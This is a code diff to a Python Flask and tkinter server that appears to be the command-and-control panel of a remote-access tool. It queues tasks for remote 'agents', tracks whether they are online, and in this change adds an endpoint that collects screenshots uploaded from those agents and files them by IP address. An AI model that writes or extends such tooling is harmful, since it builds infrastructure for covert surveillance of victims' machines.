@@ -4,6 +4,8 @@ import tkinter as tk
 import time
 import queue
 from tkinter import ttk
+import os as oos
+
 
 log_queue = queue.Queue()
 OFFLINE_TIMEOUT = 15
@@ -151,7 +153,7 @@ def render():
         task = allowed_tasks[task_name]
         
         get_user(agent_id).add_task(task)
-        log(f"[+] {task} for {agent_id} queued")
+        log(f"[*] {task} for {get_user(agent_id).ip} queued")
         
         
 
@@ -306,7 +308,18 @@ def task_check():
 
     return jsonify({"task": "NONE"})
     
+@app.route("/screenshot", methods=["POST"])
+def screenshot():
+    id = request.form.get("id")
+    file = request.files.get("file")
     
+    if not file or not id:
+        return jsonify({"error": "missing data"}), 400
+    
+    oos.makedirs("screenshots", exist_ok=True)
+    file.save(f"screenshots/{request.remote_addr}:{time.time()}.png")
+    log(f"    > Screenshot received from {request.remote_addr} ")
+    return "OK"
 
 def handling_inactive_connections(connections):
     while True:
@@ -315,9 +328,7 @@ def handling_inactive_connections(connections):
             else: con.status = "online"
         time.sleep(OFFLINE_CHECK_PERIOD)
         
-
-            
-    
+  
 
 def run_server():
     app.run(debug=True, use_reloader=False)
